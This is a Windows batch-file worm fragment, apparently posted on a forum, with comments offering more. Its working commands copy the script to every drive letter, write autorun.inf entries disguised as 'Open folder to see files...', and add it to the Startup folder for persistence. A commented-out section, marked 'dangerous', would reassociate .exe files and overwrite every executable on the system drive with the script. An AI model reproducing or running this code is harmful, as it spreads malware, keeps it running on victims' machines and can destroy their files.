rem ---------------------------------
rem Infect All Drives
 for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
 copy /Y %0 %%E:\
 echo [AutoRun] > %%E:\autorun.inf
 echo open="%%E:\%0" >> %%E:\autorun.inf
 echo action=Open folder to see files... >> %%E:\autorun.inf)
rem ---------------------------------

rem Infect Startup:

rem ---------------------------------
rem Infect Startup Folder
copy %0 "%userprofile%\Start Menu\Programs\Startup"
rem ---------------------------------

rem Infect all of a certain filetype. Comment and I'll post. Here's .exe:

rem ---------------------------------dangerous ,so greyed out.................................


rem assoc .exe=batfile
rem DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt
 rem echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_exe.txt) do copy /y %0 "%%j:%%k"


rem ---------------------------------

